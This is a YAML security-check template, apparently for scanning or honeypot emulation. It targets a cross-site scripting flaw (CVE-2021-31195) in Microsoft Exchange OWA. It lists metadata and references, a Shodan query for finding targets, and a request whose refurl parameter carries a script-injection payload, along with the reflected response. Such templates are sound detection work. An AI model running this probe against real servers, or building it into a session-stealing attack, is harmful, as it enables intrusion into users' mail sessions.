id: CVE-2021-31195
info:
  name: Microsoft Exchange Server - Cross-Site Scripting
  author: infosecsanyam
  description: Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting
    vulnerability in refurl parameter of frowny.asp.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the user''s browser, potentially
    leading to session hijacking, data theft, or other malicious activities.

    '
  remediation: 'Apply the latest security updates provided by Microsoft to mitigate
    this vulnerability.

    '
  reference:
  - https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195
  - https://nvd.nist.gov/vuln/detail/CVE-2021-31195
  - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-31195
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2021-31195
    cwe-id: CWE-79
    epss-score: 0.92095
    epss-percentile: 0.98883
    cpe: cpe:2.3:a:microsoft:exchange_server:2013:cumulative_update_23:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: microsoft
    product: exchange_server
    shodan-query: http.title:"Outlook"
  tags: cve2021,cve,microsoft,exchange,owa,xss
traps:
- request:
    method: GET
    path: /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
    headers: null
    body: null
  response:
    status_code: 500
    headers: {}
    body: alert(document.domain)//&et=ServerErrormail/bootr.ashx
